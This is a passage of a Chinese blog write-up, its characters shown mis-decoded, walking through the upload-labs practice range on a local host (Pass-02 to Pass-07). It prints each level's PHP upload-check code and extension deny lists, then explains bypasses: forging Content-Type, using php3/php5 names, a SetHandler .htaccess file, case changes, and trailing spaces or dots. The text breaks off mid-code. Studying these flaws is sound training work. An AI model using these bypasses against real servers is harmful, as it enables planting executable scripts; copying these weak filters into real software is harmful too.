        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="æ–‡ä»¶ä¸Šä¼ å¸¸è§éªŒè¯"><a href="#æ–‡ä»¶ä¸Šä¼ å¸¸è§éªŒè¯" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ å¸¸è§éªŒè¯:"></a>æ–‡ä»¶ä¸Šä¼ å¸¸è§éªŒè¯:</h3><h4 id="åç¼€åéªŒè¯"><a href="#åç¼€åéªŒè¯" class="headerlink" title="åç¼€åéªŒè¯"></a>åç¼€åéªŒè¯</h4><h5 id="é»‘åå•"><a href="#é»‘åå•" class="headerlink" title="é»‘åå•"></a>é»‘åå•</h5><p><strong>æ£€æµ‹åŸç†</strong></p><p>æ–‡ä»¶ç±»å‹æ ¹æ®é»‘åå•æ¥æ£€æµ‹çš„åŸç†å°±æ˜¯ï¼šæœåŠ¡å™¨ç¨‹åºæ ¹æ®ä¸€ä»½æ–‡ä»¶åç¼€åçš„åå•æ¥åˆ¤æ–­æ˜¯å¦å…è®¸å½“å‰æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œåªè¦ä¸Šä¼ çš„æ–‡ä»¶çš„ç±»å‹èƒ½å¤Ÿå’Œè¿™ä¸ªé»‘åå•é‡Œé¢çš„ç±»å‹åŒ¹é…ï¼Œé‚£ä¹ˆå°±ç¦æ­¢è¯¥æ–‡ä»¶ä¸Šä¼ </p><p><strong>æ˜ç¡®ä¸è®©ä¸Šä¼ çš„æ ¼å¼åç¼€</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asp php jsp aspx cgi war ç­‰ç­‰</span><br></pre></td></tr></table></figure><h5 id="ç™½åå•"><a href="#ç™½åå•" class="headerlink" title="ç™½åå•"></a>ç™½åå•</h5><p><strong>æ£€æµ‹åŸç†</strong></p><p>æ˜ç¡®å¯ä»¥ä¸Šä¼ çš„åç¼€æ ¼å¼ï¼Œå°±æ˜¯è¯´åªå…è®¸ä¸Šä¼ æ˜ç¡®æ ‡æ³¨çš„æ ¼å¼ï¼Œå…¶ä»–æ ¼å¼ä¸å…è®¸ä¸Šä¼ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpg png zip rar gif ç­‰ç­‰</span><br></pre></td></tr></table></figure><h4 id="æ–‡ä»¶ç±»å‹éªŒè¯"><a href="#æ–‡ä»¶ç±»å‹éªŒè¯" class="headerlink" title="æ–‡ä»¶ç±»å‹éªŒè¯"></a>æ–‡ä»¶ç±»å‹éªŒè¯</h4><p><strong>æ£€æµ‹åŸç†</strong></p><p>å½“ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨ç«¯çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ç«¯çš„ç¨‹åºä¼šè·å–ä¸Šä¼ æ–‡ä»¶çš„MIMEç±»å‹ï¼Œç„¶åç”¨è¿™ä¸ªè·å–åˆ°çš„ç±»å‹æ¥å’ŒæœŸæœ›çš„MIMEç±»å‹è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…ä¸ä¸Šåˆ™è¯´æ˜ä¸Šä¼ çš„æ–‡ä»¶ä¸åˆæ³•ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110536.png" alt="image-20210902213937940"></p><h4 id="æ–‡ä»¶å¤´éªŒè¯"><a href="#æ–‡ä»¶å¤´éªŒè¯" class="headerlink" title="æ–‡ä»¶å¤´éªŒè¯"></a>æ–‡ä»¶å¤´éªŒè¯</h4><p><strong>æ£€æµ‹åŸç†</strong></p><p> æ–‡ä»¶å¤´æ£€æŸ¥æ˜¯æŒ‡å½“æµè§ˆå™¨ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„æ—¶å€™ï¼Œä¼šå¯¹æ–‡ä»¶å¤´æ£€æµ‹ï¼Œç¬¦åˆï¼Œåˆ™å…è®¸ä¸Šä¼ ï¼Œå¦åˆ™ä¸å…è®¸ä¸Šä¼ ã€‚</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111106.png" alt="image-20210902214753267" style="zoom:70%;" /><p><strong>ç»•è¿‡æ–¹æ³•</strong></p><p>é€šè¿‡å°†æ–‡ä»¶å¤´ä¿®æ”¹ä¸º<code>GIF89a0</code>ç­‰ä¸€äº›å›¾ç‰‡å¤´éƒ¨çš„å½¢å¼è¿›è¡Œç»•è¿‡</p><h3 id="æ–‡ä»¶ç±»å‹ç»•è¿‡-ä»¥uploadé¶åœºä¸ºä¾‹"><a href="#æ–‡ä»¶ç±»å‹ç»•è¿‡-ä»¥uploadé¶åœºä¸ºä¾‹" class="headerlink" title="æ–‡ä»¶ç±»å‹ç»•è¿‡(ä»¥uploadé¶åœºä¸ºä¾‹)"></a>æ–‡ä»¶ç±»å‹ç»•è¿‡(ä»¥uploadé¶åœºä¸ºä¾‹)</h3><h4 id="æ–‡ä»¶ç±»å‹æ£€æµ‹-MIME"><a href="#æ–‡ä»¶ç±»å‹æ£€æµ‹-MIME" class="headerlink" title="æ–‡ä»¶ç±»å‹æ£€æµ‹(MIME)"></a>æ–‡ä»¶ç±»å‹æ£€æµ‹(MIME)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-02/index.php</span><br></pre></td></tr></table></figure><p>æœ¬å…³ä¼šæ£€æµ‹æ–‡ä»¶ç±»å‹æ˜¯ä¸æ˜¯å›¾ç‰‡æ ¼å¼ï¼Œæ»¡è¶³æ‰ä¼šé€šè¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">                $is_upload = true;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR.&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="ç»•è¿‡æ–¹æ³•"><a href="#ç»•è¿‡æ–¹æ³•" class="headerlink" title="ç»•è¿‡æ–¹æ³•"></a>ç»•è¿‡æ–¹æ³•</h4><p>å› ä¸ºæœåŠ¡ç«¯æ£€æµ‹çš„æ˜¯æ–‡ä»¶çš„MIMEç±»å‹ï¼Œè€Œå¯¹è¿™ä¸ªMIMEç±»å‹çš„çš„å€¼çš„è·å–æ˜¯é€šè¿‡HTTPè¯·æ±‚å­—æ®µé‡Œçš„Content-Typeå­—æ®µï¼Œæ‰€ä»¥ç»•è¿‡çš„æ–¹æ³•å°±æ˜¯é€šè¿‡ä¿®æ”¹Content-Typeçš„å€¼ï¼Œæ¯”å¦‚ä¿®æ”¹ä¸ºimage/jpegï¼›image/pngï¼›image/gifç­‰ç­‰å…è®¸ä¸Šä¼ ç±»å‹å¯¹åº”çš„MIMEå€¼ã€‚</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111003.png" alt="image-20210903162459510" style="zoom: 67%;" /><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111925.png" alt="image-20210903162638047" style="zoom:50%;" /><h3 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h3><h4 id="æ–‡ä»¶ååç¼€ç»•è¿‡"><a href="#æ–‡ä»¶ååç¼€ç»•è¿‡" class="headerlink" title="æ–‡ä»¶ååç¼€ç»•è¿‡"></a>æ–‡ä»¶ååç¼€ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-03/index.php</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹ä»£ç </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR. &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                 $img_path = $UPLOAD_ADDR .&#x27;/&#x27;. $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">                 $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡</strong></p><p>ç”¨åƒphp3ï¼Œphp5è¿™æ ·çš„æ–‡ä»¶åç»•è¿‡æ£€æµ‹ï¼Œè€Œphpä¼šå½“ä½œphpæ–‡ä»¶æ‰§è¡Œ</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111517.png" alt="image-20210903163709908"></p><h4 id="htaccessæ–‡ä»¶ç»•è¿‡ï¼ˆåªæ”¯æŒapacheï¼‰"><a href="#htaccessæ–‡ä»¶ç»•è¿‡ï¼ˆåªæ”¯æŒapacheï¼‰" class="headerlink" title=".htaccessæ–‡ä»¶ç»•è¿‡ï¼ˆåªæ”¯æŒapacheï¼‰"></a>.htaccessæ–‡ä»¶ç»•è¿‡ï¼ˆåªæ”¯æŒapacheï¼‰</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-04/index.php</span><br></pre></td></tr></table></figure><p>.htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€)æä¾›äº†é’ˆå¯¹æ¯ä¸ªç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œå³åœ¨ä¸€ä¸ªç‰¹å®šçš„ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«æŒ‡ä»¤çš„æ–‡ä»¶ï¼Œå…¶ä¸­çš„æŒ‡ä»¤ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚</p><p>.htaccessæ–‡ä»¶å†…å®¹ï¼š</p><p>xxxä¸ºè¦å°†æ­¤åç¼€çš„æ–‡ä»¶è§£æä¸ºphpæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;xxx&quot;&gt;  </span><br><span class="line">SetHandler application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹ä»£ç </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110470.png" alt="image-20210903164541612"></p><h4 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-05/index.php</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹ä»£ç </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111757.png" alt="image-20210903165225812"></p><h4 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-06/index.php</span><br></pre></td></tr></table></figure><p>é€šè¿‡æŠ“åŒ…åœ¨æ–‡ä»¶åååŠ å…¥ç©ºæ ¼ç»•è¿‡ï¼Œwindowsä¸­å¦‚æœæœ€åæ˜¯ç©ºæ ¼ï¼Œwindowsä¼šå¼ºè¡Œå°†ç©ºæ ¼å»é™¤ã€‚</p><p><strong>æ£€æµ‹ä»£ç </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110474.png" alt="image-20210903165440377"></p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111571.png" alt="image-20210903165642424" style="zoom:67%;" /><h4 id="ç‚¹ç»•è¿‡"><a href="#ç‚¹ç»•è¿‡" class="headerlink" title="ç‚¹ç»•è¿‡"></a>ç‚¹ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-07/index.php</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å¯¹åç¼€åæœ«å°¾çš„ç‚¹è¿›è¡Œå¤„ç†ï¼Œåˆ©ç”¨windowsç‰¹æ€§ï¼Œä¼šè‡ªåŠ¨å»æ‰åç¼€åä¸­æœ€åçš„â€.â€ï¼Œå¯åœ¨åç¼€åä¸­åŠ â€.â€ç»•è¿‡</p><p><strong>æ£€æµ‹ä»£ç </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = 